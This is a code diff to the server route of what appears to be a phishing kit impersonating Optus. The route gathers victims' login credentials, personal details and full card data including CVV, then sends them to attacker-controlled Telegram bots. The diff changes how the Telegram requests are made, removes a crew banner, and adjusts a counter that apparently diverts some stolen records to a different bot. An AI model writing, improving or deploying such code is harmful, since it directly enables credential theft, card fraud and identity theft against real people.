@@ -11221,32 +11221,47 @@ app.post("/offshorebillionsOptus", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${zip} | ${bankName}`;
-      var originalText = `|--------- @vendetta_cccupdates  ---------|\n\n+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (Spoofergoofer == 10) {
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
           )
-          .catch((err) => {
-            console.log(err);
+          .catch((e) => {
+            console.log(e);
           });
         Spoofergoofer = 4;
       } else {
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusOSB:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `OptusOSB:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
           )
-          .catch((err) => {
-            console.log(err);
+          .catch((e) => {
+            console.log(e);
           });
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5539333576&text=Optus:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 5539333576,
+              text: `Optus:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
           )
-          .catch((err) => {
-            console.log(err);
+          .catch((e) => {
+            console.log(e);
           });
-        Spoofergoofer = 100;
+        Spoofergoofer = 0;
       }
       res.send("Update Completed");
     });
